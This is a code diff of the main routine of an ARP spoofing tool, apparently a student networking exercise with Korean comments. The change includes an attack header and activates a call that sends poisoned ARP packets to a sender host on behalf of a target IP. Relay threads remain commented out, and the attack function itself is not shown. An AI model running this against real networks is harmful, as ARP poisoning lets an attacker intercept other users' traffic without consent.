@@ -8,6 +8,7 @@
 
 #include "utils.h"
 #include "extract.h"
+#include "attack.h"
 
 int main(int argc, char* argv[]) {
 	
@@ -28,12 +29,10 @@ int main(int argc, char* argv[]) {
 	printf("My MAC: %s\n", my_mac);
 	
 	// 자신의 IP주소(Attacker) 추출
-
 	char * my_ip = getAttackerIP(argv[1]);
 	printf("My IP: %s\n", my_ip);
 
 	for(int i=2; i<argc; i+=2){
-
 		// Sender Mac주소 출력
         Mac sender_mac = sendArp(handle, my_mac, my_ip, argv[i]);
 		std::cout << "Sender MAC: ";
@@ -44,9 +43,8 @@ int main(int argc, char* argv[]) {
 		std::cout << "Target MAC: ";
 		target_mac.printMac();
 		
-
-		/*	
-		arp_attack(handle, Mac(my_mac),sender_mac, argv[i], argv[i+1]); 		
+		arpAttack(handle, Mac(my_mac),sender_mac, argv[i], argv[i+1]);
+		/* 		
 		std::thread relay_thread(packet_relay, handle, Mac(my_mac), target_mac, sender_mac, argv[i], argv[i+1]);
         std::thread recover_thread(recover_check, handle, Mac(my_mac), target_mac, sender_mac, argv[i], argv[i+1]);
 		
